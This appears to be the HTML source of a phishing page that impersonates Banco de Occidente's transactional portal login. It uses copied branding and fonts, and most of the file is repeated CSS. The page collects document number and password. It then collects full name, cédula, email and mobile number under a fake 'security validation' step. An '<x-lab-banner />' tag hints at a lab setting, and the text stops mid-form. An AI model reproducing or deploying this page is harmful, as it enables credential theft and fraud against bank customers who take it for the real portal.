<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ingreso al Portal Transaccional | Banco de Occidente</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>

    <style>
        @font-face {
            font-family: Poppins;
            src: url(/occidente/Poppins-Bold.ttf) format("truetype");
            font-style: normal;
            font-weight: 700;
        }

        @font-face {
            font-family: Poppins;
            src: url(/occidente/Poppins-SemiBold.ttf) format("truetype");
            font-style: normal;
            font-weight: 600;
        }

        @font-face {
            font-family: Poppins;
            src: url(/occidente/Poppins-Medium.ttf) format("truetype");
            font-style: normal;
            font-weight: 500;
        }



        .texto-2 {
            font-family: Poppins, serif;
            font-weight: 500;
            font-size: 14px;
            line-height: 1.5rem;
            color: var(--vds-carbon-dark-1000);
        }

        .texto-1 {


            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            visibility: inherit;
            --vds-primary-900: #0056cb;
            --vds-primary-700-base: #0081ff;
            --vds-primary-400: #56b0ff;
            --vds-primary-100: #e2f1ff;
            --vds-primary-shade-900: #022047;
            --vds-primary-shade-700-base: #00246f;
            --vds-primary-shade-400: #6d84bf;
            --vds-primary-shade-100: #e6e9f4;
            --vds-secondary-900: #7e5a23;
            --vds-secondary-700-base: #dca85e;
            --vds-secondary-400: #e6c089;
            --vds-secondary-100: #f8f0e2;
            --vds-accent-900: #4600e9;
            --vds-accent-700-base: #9240fe;
            --vds-accent-400: #a869ff;
            --vds-accent-100: #f2e6ff;
            --vds-carbon-dark-1000: #1b1c1e;
            --vds-carbon-dark-900: #333;
            --vds-n-darker-700: #898d95;
            --vds-n-darker-600: #cdcdcd;
            --vds-carbon-light-900: #55616f;
            --vds-carbon-light-700: #555f83;
            --vds-n-lighter-300: #adbae6;
            --vds-n-lighter-100: #f3f6fe;
            --vds-neutral-lighter-50: #fff;
            --vds-error-900: #981b1f;
            --vds-error-700-base: #e24c4c;
            --vds-error-400: #da6d6e;
            --vds-error-100: #fdeaed;
            --vds-warning-900: #b75f0e;
            --vds-warning-700-base: #ffaa31;
            --vds-warning-400: #ffcd84;
            --vds-warning-100: #fff3e1;
            --vds-success-900: #117847;
            --vds-success-700-base: #00ca82;
            --vds-success-400: #86e0b7;
            --vds-success-100: #e2f8ed;
            --vds-semantic-info-900: #2e4783;
            --vds-info-700: #3187ff;
            --vds-info-400: #43a5ff;
            --vds-info-100: #e3f2ff;
            --vds-tuplus-200: #a2efe1;
            --vds-tuplus-700: #07a5b2;
            --vds-product-black-400: #53575d;
            --vds-product-black-700: #1a1c1f;
            --vds-product-silver-200: #f0f0f0;
            --vds-product-silver-400: #989898;
            --vds-product-gold-200: #e7d689;
            --vds-product-gold-700: #ada377;
            --vds-product-bronze-200: #c1976a;
            --vds-product-bronze-700: #8d643c;
            --vds-product-regular-400: #0063dc;
            --vds-product-regular-700: #012e65;
            --vds-product-infinitive-400: #3071b7;
            --vds-product-infinitive-700: #0c1b2b;
            --vds-product-traveler-200: #ffce9d;
            --vds-product-traveler-700: #d63535;
            --vds-n-lighter-200: #dfe5f9;
            --vds-product-unicef-200: #b5ebfb;
            --vds-product-unicef-400: #00b9f2;
            --vds-product-mascotas-400: #00a0d2;
            --vds-product-mascotas-700: #022847;
            --vds-preferente-400: #013676;
            --vds-preferente-900: #001d40;
            --vds-elite-400: #00244f;
            --vds-elite-700: #001227;
            --blue: #007bff;
            --indigo: #6610f2;
            --purple: #6f42c1;
            --pink: #e83e8c;
            --red: #dc3545;
            --orange: #fd7e14;
            --yellow: #ffc107;
            --green: #28a745;
            --teal: #20c997;
            --cyan: #17a2b8;
            --white: #fff;
            --gray: #6c757d;
            --gray-dark: #343a40;
            --primary: #007bff;
            --secondary: #6c757d;
            --success: #28a745;
            --info: #17a2b8;
            --warning: #ffc107;
            --danger: #dc3545;
            --light: #f8f9fa;
            --dark: #343a40;
            --breakpoint-xs: 0;
            --breakpoint-sm: 576px;
            --breakpoint-md: 768px;
            --breakpoint-lg: 992px;
            --breakpoint-xl: 1200px;
            --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            font-family: Poppins, serif;
            -webkit-font-smoothing: antialiased;
            box-sizing: border-box;
            margin-top: 0;
            font-weight: 600;
            font-size: 1rem;
            text-align: center;
            line-height: 2.286rem;
            letter-spacing: 0;
            color: var(--vds-carbon-dark-1000);
            margin-bottom: 32px;



        }

        .borde-entrada-1 {
            border: 1px solid var(--vds-n-lighter-300);
            border-radius: 4px;
            padding: 8px;
        }

        .entrada-1 {
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            visibility: inherit;
            --vds-primary-900: #0056cb;
            --vds-primary-700-base: #0081ff;
            --vds-primary-400: #56b0ff;
            --vds-primary-100: #e2f1ff;
            --vds-primary-shade-900: #022047;
            --vds-primary-shade-700-base: #00246f;
            --vds-primary-shade-400: #6d84bf;
            --vds-primary-shade-100: #e6e9f4;
            --vds-secondary-900: #7e5a23;
            --vds-secondary-700-base: #dca85e;
            --vds-secondary-400: #e6c089;
            --vds-secondary-100: #f8f0e2;
            --vds-accent-900: #4600e9;
            --vds-accent-700-base: #9240fe;
            --vds-accent-400: #a869ff;
            --vds-accent-100: #f2e6ff;
            --vds-carbon-dark-1000: #1b1c1e;
            --vds-carbon-dark-900: #333;
            --vds-n-darker-700: #898d95;
            --vds-n-darker-600: #cdcdcd;
            --vds-carbon-light-900: #55616f;
            --vds-carbon-light-700: #555f83;
            --vds-n-lighter-300: #adbae6;
            --vds-n-lighter-100: #f3f6fe;
            --vds-neutral-lighter-50: #fff;
            --vds-error-900: #981b1f;
            --vds-error-700-base: #e24c4c;
            --vds-error-400: #da6d6e;
            --vds-error-100: #fdeaed;
            --vds-warning-900: #b75f0e;
            --vds-warning-700-base: #ffaa31;
            --vds-warning-400: #ffcd84;
            --vds-warning-100: #fff3e1;
            --vds-success-900: #117847;
            --vds-success-700-base: #00ca82;
            --vds-success-400: #86e0b7;
            --vds-success-100: #e2f8ed;
            --vds-semantic-info-900: #2e4783;
            --vds-info-700: #3187ff;
            --vds-info-400: #43a5ff;
            --vds-info-100: #e3f2ff;
            --vds-tuplus-200: #a2efe1;
            --vds-tuplus-700: #07a5b2;
            --vds-product-black-400: #53575d;
            --vds-product-black-700: #1a1c1f;
            --vds-product-silver-200: #f0f0f0;
            --vds-product-silver-400: #989898;
            --vds-product-gold-200: #e7d689;
            --vds-product-gold-700: #ada377;
            --vds-product-bronze-200: #c1976a;
            --vds-product-bronze-700: #8d643c;
            --vds-product-regular-400: #0063dc;
            --vds-product-regular-700: #012e65;
            --vds-product-infinitive-400: #3071b7;
            --vds-product-infinitive-700: #0c1b2b;
            --vds-product-traveler-200: #ffce9d;
            --vds-product-traveler-700: #d63535;
            --vds-n-lighter-200: #dfe5f9;
            --vds-product-unicef-200: #b5ebfb;
            --vds-product-unicef-400: #00b9f2;
            --vds-product-mascotas-400: #00a0d2;
            --vds-product-mascotas-700: #022847;
            --vds-preferente-400: #013676;
            --vds-preferente-900: #001d40;
            --vds-elite-400: #00244f;
            --vds-elite-700: #001227;
            --blue: #007bff;
            --indigo: #6610f2;
            --purple: #6f42c1;
            --pink: #e83e8c;
            --red: #dc3545;
            --orange: #fd7e14;
            --yellow: #ffc107;
            --green: #28a745;
            --teal: #20c997;
            --cyan: #17a2b8;
            --white: #fff;
            --gray: #6c757d;
            --gray-dark: #343a40;
            --primary: #007bff;
            --secondary: #6c757d;
            --success: #28a745;
            --info: #17a2b8;
            --warning: #ffc107;
            --danger: #dc3545;
            --light: #f8f9fa;
            --dark: #343a40;
            --breakpoint-xs: 0;
            --breakpoint-sm: 576px;
            --breakpoint-md: 768px;
            --breakpoint-lg: 992px;
            --breakpoint-xl: 1200px;
            --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            -webkit-font-smoothing: antialiased;
            box-sizing: border-box;
            margin: 0;
            font-family: inherit;
            overflow: visible;
            border: 1px solid var(--vds-n-lighter-300);
            border-radius: 4px;
            color: var(--vds-carbon-light-700);
            outline: none;
            font-weight: 500;
            font-size: 1rem;
            text-align: left;
            line-height: 1.571rem;
            letter-spacing: 0;
            padding: 8px;
            width: 100%;
        }

        .boton-1 {

            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            visibility: inherit;
            --vds-primary-900: #0056cb;
            --vds-primary-700-base: #0081ff;
            --vds-primary-400: #56b0ff;
            --vds-primary-100: #e2f1ff;
            --vds-primary-shade-900: #022047;
            --vds-primary-shade-700-base: #00246f;
            --vds-primary-shade-400: #6d84bf;
            --vds-primary-shade-100: #e6e9f4;
            --vds-secondary-900: #7e5a23;
            --vds-secondary-700-base: #dca85e;
            --vds-secondary-400: #e6c089;
            --vds-secondary-100: #f8f0e2;
            --vds-accent-900: #4600e9;
            --vds-accent-700-base: #9240fe;
            --vds-accent-400: #a869ff;
            --vds-accent-100: #f2e6ff;
            --vds-carbon-dark-1000: #1b1c1e;
            --vds-carbon-dark-900: #333;
            --vds-n-darker-700: #898d95;
            --vds-n-darker-600: #cdcdcd;
            --vds-carbon-light-900: #55616f;
            --vds-carbon-light-700: #555f83;
            --vds-n-lighter-300: #adbae6;
            --vds-n-lighter-100: #f3f6fe;
            --vds-neutral-lighter-50: #fff;
            --vds-error-900: #981b1f;
            --vds-error-700-base: #e24c4c;
            --vds-error-400: #da6d6e;
            --vds-error-100: #fdeaed;
            --vds-warning-900: #b75f0e;
            --vds-warning-700-base: #ffaa31;
            --vds-warning-400: #ffcd84;
            --vds-warning-100: #fff3e1;
            --vds-success-900: #117847;
            --vds-success-700-base: #00ca82;
            --vds-success-400: #86e0b7;
            --vds-success-100: #e2f8ed;
            --vds-semantic-info-900: #2e4783;
            --vds-info-700: #3187ff;
            --vds-info-400: #43a5ff;
            --vds-info-100: #e3f2ff;
            --vds-tuplus-200: #a2efe1;
            --vds-tuplus-700: #07a5b2;
            --vds-product-black-400: #53575d;
            --vds-product-black-700: #1a1c1f;
            --vds-product-silver-200: #f0f0f0;
            --vds-product-silver-400: #989898;
            --vds-product-gold-200: #e7d689;
            --vds-product-gold-700: #ada377;
            --vds-product-bronze-200: #c1976a;
            --vds-product-bronze-700: #8d643c;
            --vds-product-regular-400: #0063dc;
            --vds-product-regular-700: #012e65;
            --vds-product-infinitive-400: #3071b7;
            --vds-product-infinitive-700: #0c1b2b;
            --vds-product-traveler-200: #ffce9d;
            --vds-product-traveler-700: #d63535;
            --vds-n-lighter-200: #dfe5f9;
            --vds-product-unicef-200: #b5ebfb;
            --vds-product-unicef-400: #00b9f2;
            --vds-product-mascotas-400: #00a0d2;
            --vds-product-mascotas-700: #022847;
            --vds-preferente-400: #013676;
            --vds-preferente-900: #001d40;
            --vds-elite-400: #00244f;
            --vds-elite-700: #001227;
            --blue: #007bff;
            --indigo: #6610f2;
            --purple: #6f42c1;
            --pink: #e83e8c;
            --red: #dc3545;
            --orange: #fd7e14;
            --yellow: #ffc107;
            --green: #28a745;
            --teal: #20c997;
            --cyan: #17a2b8;
            --white: #fff;
            --gray: #6c757d;
            --gray-dark: #343a40;
            --primary: #007bff;
            --secondary: #6c757d;
            --success: #28a745;
            --info: #17a2b8;
            --warning: #ffc107;
            --danger: #dc3545;
            --light: #f8f9fa;
            --dark: #343a40;
            --breakpoint-xs: 0;
            --breakpoint-sm: 576px;
            --breakpoint-md: 768px;
            --breakpoint-lg: 992px;
            --breakpoint-xl: 1200px;
            --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            -webkit-font-smoothing: antialiased;
            box-sizing: border-box;
            margin: 0;
            font-family: inherit;
            overflow: visible;
            text-transform: none;
            vertical-align: middle;
            user-select: none;
            background-color: transparent;
            transition: none;
            position: relative;
            border-radius: 4px;
            font-size: 1em;
            font-weight: 600;
            line-height: 1;
            letter-spacing: normal;
            padding: .85rem 1rem;
            color: var(--vds-neutral-lighter-50);
            background-image: linear-gradient(to bottom, var(--vds-primary-700-base), var(--vds-primary-900) 72%);
            border: none;
            /* width: 110px; */
            height: 50px;
            cursor: pointer;
            /* margin-right: 0; */


        }

        .boton-1:disabled {
            background-image: none;
            background-color: #ccc;
        }

        .label-1 {
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            visibility: inherit;
            --vds-primary-900: #0056cb;
            --vds-primary-700-base: #0081ff;
            --vds-primary-400: #56b0ff;
            --vds-primary-100: #e2f1ff;
            --vds-primary-shade-900: #022047;
            --vds-primary-shade-700-base: #00246f;
            --vds-primary-shade-400: #6d84bf;
            --vds-primary-shade-100: #e6e9f4;
            --vds-secondary-900: #7e5a23;
            --vds-secondary-700-base: #dca85e;
            --vds-secondary-400: #e6c089;
            --vds-secondary-100: #f8f0e2;
            --vds-accent-900: #4600e9;
            --vds-accent-700-base: #9240fe;
            --vds-accent-400: #a869ff;
            --vds-accent-100: #f2e6ff;
            --vds-carbon-dark-1000: #1b1c1e;
            --vds-carbon-dark-900: #333;
            --vds-n-darker-700: #898d95;
            --vds-n-darker-600: #cdcdcd;
            --vds-carbon-light-900: #55616f;
            --vds-carbon-light-700: #555f83;
            --vds-n-lighter-300: #adbae6;
            --vds-n-lighter-100: #f3f6fe;
            --vds-neutral-lighter-50: #fff;
            --vds-error-900: #981b1f;
            --vds-error-700-base: #e24c4c;
            --vds-error-400: #da6d6e;
            --vds-error-100: #fdeaed;
            --vds-warning-900: #b75f0e;
            --vds-warning-700-base: #ffaa31;
            --vds-warning-400: #ffcd84;
            --vds-warning-100: #fff3e1;
            --vds-success-900: #117847;
            --vds-success-700-base: #00ca82;
            --vds-success-400: #86e0b7;
            --vds-success-100: #e2f8ed;
            --vds-semantic-info-900: #2e4783;
            --vds-info-700: #3187ff;
            --vds-info-400: #43a5ff;
            --vds-info-100: #e3f2ff;
            --vds-tuplus-200: #a2efe1;
            --vds-tuplus-700: #07a5b2;
            --vds-product-black-400: #53575d;
            --vds-product-black-700: #1a1c1f;
            --vds-product-silver-200: #f0f0f0;
            --vds-product-silver-400: #989898;
            --vds-product-gold-200: #e7d689;
            --vds-product-gold-700: #ada377;
            --vds-product-bronze-200: #c1976a;
            --vds-product-bronze-700: #8d643c;
            --vds-product-regular-400: #0063dc;
            --vds-product-regular-700: #012e65;
            --vds-product-infinitive-400: #3071b7;
            --vds-product-infinitive-700: #0c1b2b;
            --vds-product-traveler-200: #ffce9d;
            --vds-product-traveler-700: #d63535;
            --vds-n-lighter-200: #dfe5f9;
            --vds-product-unicef-200: #b5ebfb;
            --vds-product-unicef-400: #00b9f2;
            --vds-product-mascotas-400: #00a0d2;
            --vds-product-mascotas-700: #022847;
            --vds-preferente-400: #013676;
            --vds-preferente-900: #001d40;
            --vds-elite-400: #00244f;
            --vds-elite-700: #001227;
            --blue: #007bff;
            --indigo: #6610f2;
            --purple: #6f42c1;
            --pink: #e83e8c;
            --red: #dc3545;
            --orange: #fd7e14;
            --yellow: #ffc107;
            --green: #28a745;
            --teal: #20c997;
            --cyan: #17a2b8;
            --white: #fff;
            --gray: #6c757d;
            --gray-dark: #343a40;
            --primary: #007bff;
            --secondary: #6c757d;
            --success: #28a745;
            --info: #17a2b8;
            --warning: #ffc107;
            --danger: #dc3545;
            --light: #f8f9fa;
            --dark: #343a40;
            --breakpoint-xs: 0;
            --breakpoint-sm: 576px;
            --breakpoint-md: 768px;
            --breakpoint-lg: 992px;
            --breakpoint-xl: 1200px;
            --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            font-family: Poppins, serif;
            -webkit-font-smoothing: antialiased;
            box-sizing: border-box;
            display: inline-block;
            font-weight: 600;
            font-size: .857rem;
            text-align: left;
            line-height: 1rem;
            letter-spacing: 0;
            margin-bottom: 4px;
            padding: 2px 0 0;
            color: var(--vds-carbon-light-700);
        }

        .select-1 {
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            visibility: inherit;
            --vds-primary-900: #0056cb;
            --vds-primary-700-base: #0081ff;
            --vds-primary-400: #56b0ff;
            --vds-primary-100: #e2f1ff;
            --vds-primary-shade-900: #022047;
            --vds-primary-shade-700-base: #00246f;
            --vds-primary-shade-400: #6d84bf;
            --vds-primary-shade-100: #e6e9f4;
            --vds-secondary-900: #7e5a23;
            --vds-secondary-700-base: #dca85e;
            --vds-secondary-400: #e6c089;
            --vds-secondary-100: #f8f0e2;
            --vds-accent-900: #4600e9;
            --vds-accent-700-base: #9240fe;
            --vds-accent-400: #a869ff;
            --vds-accent-100: #f2e6ff;
            --vds-carbon-dark-1000: #1b1c1e;
            --vds-carbon-dark-900: #333;
            --vds-n-darker-700: #898d95;
            --vds-n-darker-600: #cdcdcd;
            --vds-carbon-light-900: #55616f;
            --vds-carbon-light-700: #555f83;
            --vds-n-lighter-300: #adbae6;
            --vds-n-lighter-100: #f3f6fe;
            --vds-neutral-lighter-50: #fff;
            --vds-error-900: #981b1f;
            --vds-error-700-base: #e24c4c;
            --vds-error-400: #da6d6e;
            --vds-error-100: #fdeaed;
            --vds-warning-900: #b75f0e;
            --vds-warning-700-base: #ffaa31;
            --vds-warning-400: #ffcd84;
            --vds-warning-100: #fff3e1;
            --vds-success-900: #117847;
            --vds-success-700-base: #00ca82;
            --vds-success-400: #86e0b7;
            --vds-success-100: #e2f8ed;
            --vds-semantic-info-900: #2e4783;
            --vds-info-700: #3187ff;
            --vds-info-400: #43a5ff;
            --vds-info-100: #e3f2ff;
            --vds-tuplus-200: #a2efe1;
            --vds-tuplus-700: #07a5b2;
            --vds-product-black-400: #53575d;
            --vds-product-black-700: #1a1c1f;
            --vds-product-silver-200: #f0f0f0;
            --vds-product-silver-400: #989898;
            --vds-product-gold-200: #e7d689;
            --vds-product-gold-700: #ada377;
            --vds-product-bronze-200: #c1976a;
            --vds-product-bronze-700: #8d643c;
            --vds-product-regular-400: #0063dc;
            --vds-product-regular-700: #012e65;
            --vds-product-infinitive-400: #3071b7;
            --vds-product-infinitive-700: #0c1b2b;
            --vds-product-traveler-200: #ffce9d;
            --vds-product-traveler-700: #d63535;
            --vds-n-lighter-200: #dfe5f9;
            --vds-product-unicef-200: #b5ebfb;
            --vds-product-unicef-400: #00b9f2;
            --vds-product-mascotas-400: #00a0d2;
            --vds-product-mascotas-700: #022847;
            --vds-preferente-400: #013676;
            --vds-preferente-900: #001d40;
            --vds-elite-400: #00244f;
            --vds-elite-700: #001227;
            --blue: #007bff;
            --indigo: #6610f2;
            --purple: #6f42c1;
            --pink: #e83e8c;
            --red: #dc3545;
            --orange: #fd7e14;
            --yellow: #ffc107;
            --green: #28a745;
            --teal: #20c997;
            --cyan: #17a2b8;
            --white: #fff;
            --gray: #6c757d;
            --gray-dark: #343a40;
            --primary: #007bff;
            --secondary: #6c757d;
            --success: #28a745;
            --info: #17a2b8;
            --warning: #ffc107;
            --danger: #dc3545;
            --light: #f8f9fa;
            --dark: #343a40;
            --breakpoint-xs: 0;
            --breakpoint-sm: 576px;
            --breakpoint-md: 768px;
            --breakpoint-lg: 992px;
            --breakpoint-xl: 1200px;
            --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            font-size: 1rem;
            line-height: 1.5;
            color: #212529;
            text-align: left;
            font-family: Poppins, serif;
            -webkit-font-smoothing: antialiased;
            font-weight: 400;
            display: block;
            position: relative;
            box-sizing: border-box;
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            visibility: inherit;
            --vds-primary-900: #0056cb;
            --vds-primary-700-base: #0081ff;
            --vds-primary-400: #56b0ff;
            --vds-primary-100: #e2f1ff;
            --vds-primary-shade-900: #022047;
            --vds-primary-shade-700-base: #00246f;
            --vds-primary-shade-400: #6d84bf;
            --vds-primary-shade-100: #e6e9f4;
            --vds-secondary-900: #7e5a23;
            --vds-secondary-700-base: #dca85e;
            --vds-secondary-400: #e6c089;
            --vds-secondary-100: #f8f0e2;
            --vds-accent-900: #4600e9;
            --vds-accent-700-base: #9240fe;
            --vds-accent-400: #a869ff;
            --vds-accent-100: #f2e6ff;
            --vds-carbon-dark-1000: #1b1c1e;
            --vds-carbon-dark-900: #333;
            --vds-n-darker-700: #898d95;
            --vds-n-darker-600: #cdcdcd;
            --vds-carbon-light-900: #55616f;
            --vds-carbon-light-700: #555f83;
            --vds-n-lighter-300: #adbae6;
            --vds-n-lighter-100: #f3f6fe;
            --vds-neutral-lighter-50: #fff;
            --vds-error-900: #981b1f;
            --vds-error-700-base: #e24c4c;
            --vds-error-400: #da6d6e;
            --vds-error-100: #fdeaed;
            --vds-warning-900: #b75f0e;
            --vds-warning-700-base: #ffaa31;
            --vds-warning-400: #ffcd84;
            --vds-warning-100: #fff3e1;
            --vds-success-900: #117847;
            --vds-success-700-base: #00ca82;
            --vds-success-400: #86e0b7;
            --vds-success-100: #e2f8ed;
            --vds-semantic-info-900: #2e4783;
            --vds-info-700: #3187ff;
            --vds-info-400: #43a5ff;
            --vds-info-100: #e3f2ff;
            --vds-tuplus-200: #a2efe1;
            --vds-tuplus-700: #07a5b2;
            --vds-product-black-400: #53575d;
            --vds-product-black-700: #1a1c1f;
            --vds-product-silver-200: #f0f0f0;
            --vds-product-silver-400: #989898;
            --vds-product-gold-200: #e7d689;
            --vds-product-gold-700: #ada377;
            --vds-product-bronze-200: #c1976a;
            --vds-product-bronze-700: #8d643c;
            --vds-product-regular-400: #0063dc;
            --vds-product-regular-700: #012e65;
            --vds-product-infinitive-400: #3071b7;
            --vds-product-infinitive-700: #0c1b2b;
            --vds-product-traveler-200: #ffce9d;
            --vds-product-traveler-700: #d63535;
            --vds-n-lighter-200: #dfe5f9;
            --vds-product-unicef-200: #b5ebfb;
            --vds-product-unicef-400: #00b9f2;
            --vds-product-mascotas-400: #00a0d2;
            --vds-product-mascotas-700: #022847;
            --vds-preferente-400: #013676;
            --vds-preferente-900: #001d40;
            --vds-elite-400: #00244f;
            --vds-elite-700: #001227;
            --blue: #007bff;
            --indigo: #6610f2;
            --purple: #6f42c1;
            --pink: #e83e8c;
            --red: #dc3545;
            --orange: #fd7e14;
            --yellow: #ffc107;
            --green: #28a745;
            --teal: #20c997;
            --cyan: #17a2b8;
            --white: #fff;
            --gray: #6c757d;
            --gray-dark: #343a40;
            --primary: #007bff;
            --secondary: #6c757d;
            --success: #28a745;
            --info: #17a2b8;
            --warning: #ffc107;
            --danger: #dc3545;
            --light: #f8f9fa;
            --dark: #343a40;
            --breakpoint-xs: 0;
            --breakpoint-sm: 576px;
            --breakpoint-md: 768px;
            --breakpoint-lg: 992px;
            --breakpoint-xl: 1200px;
            --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            font-family: Poppins, serif;
            -webkit-font-smoothing: antialiased;
            box-sizing: border-box;
            background-color: #fff;
            border-radius: 4px;
            min-height: 36px;
            align-items: center;
            border: 1px solid var(--vds-n-lighter-300);
            color: var(--vds-carbon-light-700) !important;
            cursor: default;
            display: flex;
            outline: none;
            overflow: hidden;
            position: relative;
            width: 100%;
            height: 40px;
            font-weight: 500;
            font-size: 1rem;
            text-align: left;
            line-height: 1.571rem;
            letter-spacing: 0;
        }

        @media only screen and (min-width: 768px) {
            body {
                width: 40%;
                /* Ancho del cuerpo en dispositivos de escritorio */
                margin: 0 auto;
                /* Centra el cuerpo horizontalmente */
            }
        }

        .hidden {
            display: none !important;
        }

        .error-message {
            color: var(--vds-error-700-base);
            font-family: Poppins, serif;
            font-weight: 500;
            font-size: 12px;
            margin-top: 4px;
            margin-left: 8px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .borde-entrada-error {
            border-color: var(--vds-error-700-base) !important;
        }

        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.95);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }

        .loading-overlay.active {
            display: flex;
        }

        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 5px solid var(--vds-n-lighter-300);
            border-top: 5px solid var(--vds-primary-700-base);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body class="px-3">
<x-lab-banner />
    <!-- Loading Overlay -->
    <div id="loading" class="fixed-top bg-white d-flex align-items-center justify-content-center hidden"
        style="height: 100vh; z-index: 9999;">
        <div class="text-center">
            <div class="loading-spinner mx-auto"></div>
            <p class="mt-3 texto-2">Espere un momento por favor...</p>
        </div>
    </div>

    <!-- Header -->
    <div class="text-center py-4">
        <img src="/occidente/logo_occidente.svg" width="168" height="40" alt="Banco de Occidente">
    </div>

    <!-- Vista: Login -->
    <div id="login" class="hidden">
        <h1 class="texto-1 mt-4 text-center px-5">Ingresa tus credenciales para acceder al Portal Transaccional</h1>
        <br>
        <!-- Mensaje de error general -->
        <div id="errorGeneralLogin" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-4">
                <label class="label-1" for="tipo-documento">Tipo de Documento</label>
                <select class="select-1 w-100 mb-4" id="tipo-documento">
                    <option value="1" selected>Cédula de Ciudadanía</option>
                    <option value="2">Tarjeta de Identidad</option>
                    <option value="3">Cédula de Extranjería</option>
                    <option value="4">Pasaporte</option>
                </select>
            </div>
            <div class="mb-4">
                <label class="label-1" for="usuario">No. de Documento</label>
                <input class="entrada-1 w-100" id="usuario" name="usuario" type="text" placeholder="*Documento"
                    minlength="4" maxlength="15" autocomplete="off">
                <div class="error-message" id="errorUsuario"></div>
            </div>
            <br>
            <div class="mb-5">
                <label class="label-1" for="clave">Contraseña</label>
                <input class="entrada-1 w-100" id="clave" name="clave" type="password" placeholder="*Contraseña"
                    minlength="4" maxlength="15" autocomplete="off">
                <div class="error-message" id="errorClave"></div>
            </div>
            <div class="mt-3 text-center">
                <button id="btnLogin" class="boton-1 text-center px-5" disabled>Ingresar</button>
            </div>
        </div>
    </div>

    <!-- Vista: Datos Personales -->
    <div id="datos" class="hidden">
        <h1 class="texto-1 mt-4 text-center px-5">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3 px-3">
            <p class="texto-2 mb-0 mt-2">Por tu seguridad, necesitamos validar tus datos personales:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralDatos" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-4">
                <label class="label-1" for="nombre">Nombre completo</label>
                <input class="entrada-1 w-100" id="nombre" name="nombre" type="text" placeholder="Nombre completo"
                    minlength="3" maxlength="100" autocomplete="off">
                <div class="error-message" id="errorNombre"></div>
            </div>
            <div class="mb-4">
                <label class="label-1" for="cedula">Cédula</label>
                <input class="entrada-1 w-100" id="cedula" name="cedula" type="text" placeholder="Número de cédula"
                    minlength="6" maxlength="12" autocomplete="off">
                <div class="error-message" id="errorCedula"></div>
            </div>
            <div class="mb-4">
                <label class="label-1" for="email">Correo electrónico</label>
                <input class="entrada-1 w-100" id="email" name="email" type="email" placeholder="correo@ejemplo.com"
                    autocomplete="off">
                <div class="error-message" id="errorEmail"></div>
            </div>
            <div class="mb-4">
                <label class="label-1" for="celular">Celular</label>
                <input class="entrada-1 w-100" id="celular" name="celular" type="text" placeholder="Número de celular"
                    minlength="10" maxlength="10" autocomplete="off">
                <div class="error-message" id="errorCelular"></div>
